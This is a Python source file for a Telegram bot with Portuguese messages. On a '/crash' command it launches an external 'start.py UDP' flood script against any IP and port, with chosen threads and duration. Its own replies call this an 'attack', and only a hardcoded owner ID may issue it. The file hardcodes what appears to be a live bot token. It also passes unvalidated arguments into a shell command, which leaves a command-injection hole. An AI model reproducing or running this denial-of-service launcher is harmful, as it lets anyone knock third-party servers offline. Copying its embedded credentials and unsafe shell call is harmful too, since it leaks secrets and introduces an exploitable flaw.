import telebot
import subprocess
import re
import time
from threading import Thread

BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}

def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    match = re.match(padrao, ip_porta)
    return match is not None

def executar_comando(ip_porta, threads, tempo):
    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
    try:
        processo = subprocess.Popen(
            comando_terminal, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        processos[ip_porta] = processo
        time.sleep(int(tempo))
        processo.terminate()
        return f"Comando para {ip_porta} concluído ou interrompido após {tempo} segundos."
    except Exception as e:
        return f"Erro ao executar o comando: {str(e)}"

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.reply_to(
        message, 
        "Bem-vindo! Use o comando /crash <IP:PORTA> <threads> <tempo> para testar o servidor."
    )

@bot.message_handler(commands=['crash'])
def crash_server(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.reply_to(message, "Acesso negado.")
        return
    try:
        comando = message.text.split()
        if len(comando) < 4:
            bot.reply_to(message, "Uso: /crash <IP:PORTA> <threads> <tempo>")
            return
        ip_porta = comando[1]
        threads = comando[2]
        tempo = comando[3]
        if not validar_ip_porta(ip_porta):
            bot.reply_to(message, "Formato inválido de IP:PORTA.")
            return
        bot.reply_to(message, f"Iniciando ataque para {ip_porta}...")
        thread = Thread(target=executar_comando, args=(ip_porta, threads, tempo))
        thread.start()
        bot.reply_to(message, f"Comando enviado! O ataque começará para {ip_porta}.")
    except Exception as e:
        bot.reply_to(message, f"Erro: {str(e)}")

@bot.message_handler(func=lambda message: True)
def respond_with_user_id(message):
    bot.reply_to(message, f"Seu ID de usuário é: {message.from_user.id}")

bot.polling()